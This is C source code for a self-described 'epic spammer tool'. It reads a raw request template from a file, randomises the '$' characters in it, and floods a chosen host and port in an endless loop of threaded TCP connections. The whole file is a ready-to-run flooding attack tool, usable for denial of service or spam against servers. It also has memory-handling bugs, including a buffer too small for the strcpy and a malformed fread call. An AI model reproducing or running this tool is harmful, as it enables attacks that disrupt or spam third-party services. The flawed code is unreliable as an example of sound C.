#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <netdb.h>
#include <time.h>

#define delay 1// delay in seconds

struct sockaddr_in sa;
char *req; 
char *charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
struct timeval tv;
int port;

int changereq(char *req2) {
 int a;
 for(int i = 0; i < strlen(req2); i++) {
  a = rand() % (strlen(charset) - 0) + 0;
  if(req2[i] == '$') {
   req2[i] = charset[a];
  }
 }
}

void *spam() {
 char *req2 = malloc(strlen(req)); 
 memset(req2, 0, strlen(req));
 strcpy(req2, req);
 changereq(req2);
 int fd = socket(AF_INET, SOCK_STREAM, 0); 
 setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
 setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
 if(connect(fd, (struct sockaddr *)&sa, sizeof(sa)) != -1) {
  send(fd, req2, strlen(req2), MSG_NOSIGNAL);
  char *resp = malloc(1024);
  memset(resp, 0, 1024);
  recv(fd, resp, 1024, 0);
  dprintf(1, "REQUEST:\n%s\nRESPONSE:\n%s", req2, resp);
  free(resp);
 }
 close(fd);
 free(req2);
}

int readreq(char *file) {
 if(access(file, R_OK) == 0) {
  FILE *fd = fopen(file, "rb");
  fseek(fd, 0, SEEK_END); 
  int size = ftell(fd); 
  fseek(fd, 0, SEEK_SET); 
  req = malloc(size); 
  memset(req, 0, size);
  fread(req, size, size, fd); 
  fclose(fd);
 } else {
  dprintf(1, "File does not exist\n");
  exit(0);
 }
}

int makesa(char *ip) {
 struct hostent *host;
 host = gethostbyname(ip);
 sa.sin_addr.s_addr = *((unsigned int *)host->h_addr);
 sa.sin_port = htons(port);
 sa.sin_family = AF_INET;
}

int main(int argc, char **argv) {
 tv.tv_sec = 1;
 srand(time(0));
 dprintf(1, "The epic spammer tool\nMade by Chakal\n");
 sleep(1);
 if(argc < 5) {
  dprintf(1, "domain port threads file\n");
  return 0;
 } 
 port = atoi(argv[2]);
 makesa(argv[1]);
 readreq(argv[4]); 
 pthread_t thread[atoi(argv[3])];
 while(1) {
  for(int i = 0; i < atoi(argv[3]); i++) {
   pthread_create(&thread[i], 0, &spam, 0); 
  }
  for(int i = 0; i < atoi(argv[3]); i++) {
   pthread_join(thread[i], 0);
  }
 }
}
